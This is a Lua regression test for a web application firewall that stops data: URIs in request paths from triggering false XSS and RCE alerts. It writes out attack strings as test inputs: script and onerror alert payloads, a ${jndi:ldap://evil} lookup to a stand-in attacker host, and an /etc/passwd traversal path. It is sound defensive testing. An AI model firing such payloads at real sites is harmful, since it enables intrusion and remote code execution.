-- Regression: a data: URI in the request PATH is a client-side artifact (a
-- browser / link-preview crawler resolved an inline `data:...` URI as a RELATIVE
-- url, so the whole payload arrives as the path and 404s). Its inline JavaScript
-- or base64 image/font must NOT read as reflected XSS (rule 302) or code-exec
-- (rule 320). Two production FPs drove this:
--   * facebookexternalhit crawling `data:text/javascript,<counter script>` on
--     mobian.eu -> WAF_XSS challenge (broke that site's Facebook link previews).
--   * a real Greek Vodafone customer on epiplosou.gr hitting a
--     `/product/.../data:image/jpg;base64,<blob>` URL -> WAF_RCE **block+ban**
--     (the base64 blob coincidentally contained "eval"/"exec"/"system", all
--     base64-alphabet letters).
-- The fix must clear these WITHOUT weakening XSS/RCE on real paths/args and
-- WITHOUT letting a `data:` path prefix evade the structural markers.

_G.ngx = {
  now = function() return 1000 end, decode_base64 = function(_) return nil end,
  log = function(_, _) end, ERR = 0, WARN = 1, INFO = 2,
}
package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end
local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end
local function get(uri, args)
  return { uri = uri, args = args or "", method = "get", headers = {}, body = "", cookie = "" }
end
local function fires(c, label, want)
  local hit, reason = waf.check(c)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  if want then check(reason == want, label .. " — reason=" .. want .. " (got " .. tostring(reason) .. ")") end
end
local function clean(c, label)
  local hit = waf.check(c)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

set_only({
  rule_xss = "challenge", rule_rce = "block",
  rule_traversal = "challenge", rule_sqli = "block",
})

-- ── The FPs: data: URI as request PATH stays clean ───────────────────────────
clean(get("/data:text/javascript,%2F%2F%20x%0As.onload%20%3D%20function%28%29%7B%7D%3B%20var%20P%3DFoo.prototype%3B"),
      "facebook data:text/javascript (onload=/.prototype legit JS)")
clean(get("/product/rustic-plus/data:image/jpg;base64,/9j/4AAQSkZJRgABsystemAeXecQevalXQkZ1234567890abcdef"),
      "epiplosou data:image/jpg;base64 blob (eval/exec/system as base64 letters)")
clean(get("/data:image/png;base64,iVBORw0KGgoeval%28xAAAA"),
      "data:image/png;base64 path is cleared even with a literal eval(")
clean(get("/data:image/svg+xml,<svg onload=alert(1)>"),
      "data:image/svg+xml path with onload= is a client artifact, not reflected XSS")

-- A path segment that merely ENDS in "data:" (metadata:/userdata:) is NOT a data
-- URI and must still be scanned — the `%f[%a]` scheme-boundary anchor guarantees it.
fires(get("/api/metadata:image/x", "q=<img src=x onerror=alert(1)>"),
      "metadata: path is not a data: URI — XSS still scanned", "WAF_XSS")

-- ── No regression: real XSS / RCE on normal paths and args still fire ────────
fires(get("/search", "q=<script>alert(1)</script>"), "real <script> XSS on normal path", "WAF_XSS")
fires(get("/p", "x=<img src=x onerror=alert(1)>"),   "real onerror= XSS on normal path", "WAF_XSS")
fires(get("/x", "d=;base64,QQ==;eval(1)"),           "real base64,+eval( RCE in args",   "WAF_RCE")

-- ── No evasion: a data: PREFIX must not smuggle an attack past the WAF ───────
-- data: only appears in the PATH check; a real data: attack in the QUERY still fires.
fires(get("/redir", "u=data:text/html,<script>alert(1)</script>"),
      "data:text/html in QUERY STRING still scanned for XSS", "WAF_XSS")
-- structural markers stay full-surface, so a data: path can't hide them.
fires(get("/data:image/x,${jndi:ldap://evil}"), "jndi in a data: path still fires (no evasion)", "WAF_RCE")
fires(get("/data:image/x,/../../../../etc/passwd"), "traversal in a data: path still fires (no evasion)", "WAF_TRAVERSAL")

if fails > 0 then
  io.stderr:write(("cfm_waf data: URI FP tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf data: URI path carve-out (rules 302 XSS / 320 RCE)")
